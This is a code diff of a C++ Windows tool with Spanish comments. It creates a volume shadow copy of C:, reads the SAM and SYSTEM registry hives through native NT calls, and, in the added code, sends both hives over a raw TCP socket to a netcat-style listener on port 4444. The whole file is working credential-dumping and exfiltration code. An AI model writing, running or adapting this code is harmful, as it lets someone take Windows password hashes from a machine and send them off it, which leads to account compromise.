@@ -1,4 +1,6 @@
 #define _WIN32_DCOM
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <comdef.h>
 #include <iostream>
@@ -10,9 +12,21 @@
 #include <vsbackup.h>
 #include <vector>
 
-#pragma comment(lib, "vssapi.lib")
+// #include <winsock2.h>
+// #include <ws2tcpip.h>
 
 #define FILE_OPEN 0x00000001
+
+#pragma comment(lib, "vssapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+
+
+struct FileHeader {
+    char filename[32];      // Nombre del archivo
+    uint32_t filesize;      // Tamaño en bytes (network byte order)
+    uint32_t checksum;      // Optional: checksum para verificar
+};
+
 
 typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
 typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
@@ -25,6 +39,83 @@ typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
 NtCreateFileFn NtCreateFile;
 NtReadFileFn NtReadFile;
 NtCloseFn NtClose;
+
+
+bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::vector<BYTE>& filedata) {
+    // Preparar el header
+    FileHeader header;
+    memset(&header, 0, sizeof(header));
+
+    // Copiar nombre del archivo (máximo 31 caracteres + null terminator)
+    strncpy_s(header.filename, sizeof(header.filename), filename.c_str(), _TRUNCATE);
+    header.filesize = htonl(static_cast<uint32_t>(filedata.size()));
+    header.checksum = htonl(0); // Podrías calcular un checksum aquí
+
+    // 1. Enviar header
+    int bytes_sent = send(sock, reinterpret_cast<const char*>(&header), sizeof(header), 0);
+    if (bytes_sent != sizeof(header)) {
+        printf("Error enviando header para %s\n", filename.c_str());
+        return false;
+    }
+
+    // 2. Enviar datos del archivo
+    bytes_sent = send(sock, reinterpret_cast<const char*>(filedata.data()),
+        static_cast<int>(filedata.size()), 0);
+    if (bytes_sent != filedata.size()) {
+        printf("Error enviando datos para %s\n", filename.c_str());
+        return false;
+    }
+
+    printf("%s enviado (%zu bytes)\n", filename.c_str(), filedata.size());
+    return true;
+}
+
+
+bool send_files_to_netcat(const std::vector<BYTE>& sam_data,
+    const std::vector<BYTE>& system_data,
+    const char* host, int port) {
+    // Inicializar Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        printf("Error inicializando Winsock\n");
+        return false;
+    }
+
+    // Crear socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        printf("Error creando socket\n");
+        WSACleanup();
+        return false;
+    }
+
+    // Configurar dirección del servidor
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(port);
+    inet_pton(AF_INET, host, &serverAddr.sin_addr);
+
+    // Conectar
+    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
+        printf("Error conectando a %s:%d\n", host, port);
+        closesocket(sock);
+        WSACleanup();
+        return false;
+    }
+
+    printf("Conectado a %s:%d\n", host, port);
+
+    // Enviar archivos
+    bool success = true;
+    success &= send_file_over_socket(sock, "sam", sam_data);
+    success &= send_file_over_socket(sock, "system", system_data);
+
+    // Cerrar conexión
+    closesocket(sock);
+    WSACleanup();
+
+    return success;
+}
 
 
 std::wstring GuidToWString(GUID id) {
@@ -132,9 +223,25 @@ int list_shadows() {
 
 
 HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObject) {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    PrintHR("CoInitializeEx", hr);
+
+    if (SUCCEEDED(hr)) {
+        IVssBackupComponents* pBackup = nullptr;
+        hr = CreateVssBackupComponents(&pBackup);
+        PrintHR("CreateVssBackupComponents", hr);
+
+        if (SUCCEEDED(hr) && pBackup) {
+            hr = pBackup->InitializeForBackup();
+            PrintHR("InitializeForBackup", hr);
+            pBackup->Release();
+        }
+        CoUninitialize();
+    }
+
     std::wcout << L"\n=== CREANDO SHADOW COPY PARA: " << volumePath << L" ===\n";
 
-    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     PrintHR("CoInitializeEx", hr);
     if (FAILED(hr)) return hr;
 
@@ -362,61 +469,6 @@ HANDLE OpenFileWithNT(const wchar_t* filePath) {
 }
 
 
-BOOL ReadAndDisplayFileBytes(HANDLE fileHandle) {
-    BYTE buffer[1024*10];
-    IO_STATUS_BLOCK ioStatusBlock;
-    LARGE_INTEGER byteOffset = { 0 };
-
-    printf("Contenido del archivo (en bytes hexadecimales):\n");
-    printf("==============================================\n");
-
-    while (TRUE) {
-        NTSTATUS status = NtReadFile(
-            fileHandle,
-            NULL,
-            NULL,
-            NULL,
-            &ioStatusBlock,
-            buffer,
-            sizeof(buffer),
-            &byteOffset,
-            NULL
-        );
-
-        if (status != 0 && status != 0x00000103) { // STATUS_SUCCESS y STATUS_PENDING
-            if (status == 0x80000006) { // STATUS_END_OF_FILE
-                break;
-            }
-            printf("Error en lectura. Código NT: 0x%08X\n", status);
-            return FALSE;
-        }
-
-        DWORD bytesRead = (DWORD)ioStatusBlock.Information;
-
-        if (bytesRead == 0) {
-            break; // Fin del archivo
-        }
-
-        // Mostrar bytes en formato hexadecimal
-        for (DWORD i = 0; i < bytesRead; i++) {
-            printf("%02X ", buffer[i]);
-
-            // Nueva línea cada 16 bytes para mejor formato
-            if ((i + 1) % 16 == 0) {
-                printf("\n");
-            }
-        }
-
-        // Actualizar offset para siguiente lectura
-        byteOffset.QuadPart += bytesRead;
-
-        printf("\n--- Read %lu bytes ---\n", bytesRead);
-    }
-
-    return TRUE;
-}
-
-
 std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
     std::vector<BYTE> fileContent;
     BYTE buffer[4096];
@@ -474,50 +526,22 @@ std::vector<BYTE> read_file(const wchar_t* filePath) {
     HANDLE fileHandle = OpenFileWithNT(filePath);
     if (!fileHandle) {
         printf("No se pudo abrir el archivo.\n");
-        return fileContent; // vector vacío
+        return fileContent;
     }
-
     printf("Archivo abierto correctamente. Handle: %p\n", fileHandle);
 
-    // Leer bytes (sin imprimir)
     fileContent = ReadFileBytes(fileHandle);
-
     printf("Read %zu bytes.\n", fileContent.size());
 
-    // Cerrar handle
     NtClose(fileHandle);
     printf("Handle del archivo cerrado.\n");
-
     return fileContent;
 }
 
 
 int main() {
-    std::cout << "=== TEST VSS - CREACION DE SHADOW COPY ===\n";
-
-    // Primero probemos el test básico
-    std::cout << "\n--- Test Basico ---" << std::endl;
-    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    PrintHR("CoInitializeEx", hr);
-
-    if (SUCCEEDED(hr)) {
-        IVssBackupComponents* pBackup = nullptr;
-        hr = CreateVssBackupComponents(&pBackup);
-        PrintHR("CreateVssBackupComponents", hr);
-
-        if (SUCCEEDED(hr) && pBackup) {
-            hr = pBackup->InitializeForBackup();
-            PrintHR("InitializeForBackup", hr);
-            pBackup->Release();
-        }
-        CoUninitialize();
-    }
-
-    // Ahora probemos crear shadow copy
-    std::cout << "\n--- Crear Shadow Copy ---" << std::endl;
-    
     std::wstring basePath;
-    hr = create_shadow(L"C:\\", basePath);
+    HRESULT hr = create_shadow(L"C:\\", basePath);
 
     if (!basePath.empty()) {
         std::wcout << L"\nExito: Shadow copy creado! Device Object: " << basePath << std::endl;
@@ -526,20 +550,23 @@ int main() {
         std::cout << "\nFallo: No se pudo crear shadow copy" << std::endl;
     }
 
-    // std::wstring fullPath = basePath + L"\\windows\\system32\\config\\sam";
-    // std::wstring fullPath = basePath + L"\\windows\\system32\\config\\system"; 
-    
     size_t pos = basePath.find(L"\\\\?\\");
     if (pos != std::wstring::npos) {
         basePath.replace(pos, 4, L"\\??\\");
     }
 
     std::wstring fullPathSam    = basePath + L"\\windows\\system32\\config\\sam";
-    std::wstring fullPathSystem = basePath + L"\\windows\\system32\\config\\system";
-    // std::wstring fullPath = basePath + L"\\temp\\test1.txt";
+    std::wstring fullPathSystem = basePath + L"\\windows\\system32\\config\\system"; // L"\\temp\\test1.txt";
 
     std::vector<BYTE> SamBytes      = read_file(fullPathSam.c_str());
-    std::vector<BYTE> SystemmBytes  = read_file(fullPathSystem.c_str());
+    std::vector<BYTE> SystemBytes   = read_file(fullPathSystem.c_str());
+
+    if (send_files_to_netcat(SamBytes, SystemBytes, "127.0.0.1", 4444)) {
+        printf("Archivos enviados exitosamente\n");
+    }
+    else {
+        printf("Error enviando archivos\n");
+    }
 
     /*
     list_shadows();
